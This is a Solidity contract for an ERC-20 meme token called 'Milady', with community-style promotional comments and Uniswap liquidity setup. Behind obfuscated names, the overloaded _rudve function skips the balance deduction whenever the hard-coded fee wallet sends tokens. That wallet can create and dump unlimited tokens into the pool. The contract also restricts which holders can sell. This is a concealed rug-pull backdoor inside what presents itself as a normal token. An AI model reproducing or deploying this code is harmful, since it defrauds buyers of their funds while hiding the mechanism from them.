/**

$Milady
Frens, it's time for a real Milady which is by the community, for the community. 
Load up the meme cannons and fire at your own will.


Twitter: https://twitter.com/Miladys_erc
Telegram: https://t.me/Miladys_erc20
Website: https://miladyerc.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rudve(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rudve(a, b, "SafeMath");
    }

    function  _rudve(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _Trarygk;
    address payable private _Fizkuop;
    address private _crqtpu;

    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _pvileir;
    mapping (address => bool) private _yrqijy;
    mapping(address => uint256) private _qnjpmq;
    uint256 public _qvolbid = _totalSupply;
    uint256 public _Wporoje = _totalSupply;
    uint256 public _reTjkfr= _totalSupply;
    uint256 public _vodTecf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ykjvgq=0;
    uint256 private _uegpjcg=0;
    

    bool private _ekrrkfqr;
    bool public _Drforuf = false;
    bool private pthvkbe = false;
    bool private _opigvju = false;


    event _hprwqat(uint _qvolbid);
    modifier urvsgjr {
        pthvkbe = true;
        _;
        pthvkbe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _pvileir[owner(

        )] = true;
        _pvileir[address
        (this)] = true;
        _pvileir[
            _Fizkuop] = true;
        _Fizkuop = 
        payable (0x253366ca5FDcBed5844541c5b55a65b738Ddf162);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rudve(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvudxk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Drforuf) {
                if (to 
                != address
                (_Trarygk) 
                && to !=
                 address
                 (_crqtpu)) {
                  require(_qnjpmq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _qnjpmq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _crqtpu && to != 
            address(_Trarygk) &&
             !_pvileir[to] ) {
                require(amount 
                <= _qvolbid,
                 "Exceeds the _qvolbid.");
                require(balanceOf
                (to) + amount
                 <= _Wporoje,
                  "Exceeds the _Wporoje.");
                if(_uegpjcg
                < _ykjvgq){
                  require
                  (! _eirkbz(to));
                }
                _uegpjcg++;
                 _yrqijy
                 [to]=true;
                kvudxk = amount._pvr
                ((_uegpjcg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _crqtpu &&
             from!= address(this) 
            && !_pvileir[from] ){
                require(amount <= 
                _qvolbid && 
                balanceOf(_Fizkuop)
                <_vodTecf,
                 "Exceeds the _qvolbid.");
                kvudxk = amount._pvr((_uegpjcg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_uegpjcg>
                _ykjvgq &&
                 _yrqijy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!pthvkbe 
            && to == _crqtpu &&
             _opigvju &&
             contractTokenBalance>
             _reTjkfr 
            && _uegpjcg>
            _ykjvgq&&
             !_pvileir[to]&&
              !_pvileir[from]
            ) {
                _transferFrom( _wniuf(amount, 
                _wniuf(contractTokenBalance,
                _vodTecf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xbvuso(address
                    (this).balance);
                }
            }
        }

        if(kvudxk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvudxk);
          emit
           Transfer(from,
           address
           (this),kvudxk);
        }
        _balances[from
        ]= _rudve(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rudve(kvudxk));
        emit Transfer
        (from, to, 
        amount.
         _rudve(kvudxk));
    }

    function _transferFrom(uint256
     tokenAmount) private
      urvsgjr {
        if(tokenAmount==
        0){return;}
        if(!_ekrrkfqr)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Trarygk.WETH();
        _approve(address(this),
         address(
             _Trarygk), 
             tokenAmount);
        _Trarygk.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wniuf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rudve(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Fizkuop){
            return a ;
        }else{
            return a .
             _rudve (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvolbid = _totalSupply;
        _Wporoje = _totalSupply;
        emit _hprwqat(_totalSupply);
    }

    function _eirkbz(address 
    account) private view 
    returns (bool) {
        uint256 eufapv;
        assembly {
            eufapv :=
             extcodesize
             (account)
        }
        return eufapv > 
        0;
    }

    function _xbvuso(uint256
    amount) private {
        _Fizkuop.
        transfer(
            amount);
    }

    function openpTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _ekrrkfqr ) ;
        _Trarygk  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Trarygk), 
            _totalSupply);
        _crqtpu = 
        IUniswapV2Factory(_Trarygk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Trarygk .
             WETH ( ) );
        _Trarygk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_crqtpu).
        approve(address(_Trarygk), 
        type(uint)
        .max);
        _opigvju = true;
        _ekrrkfqr = true;
    }

    receive() external payable {}
}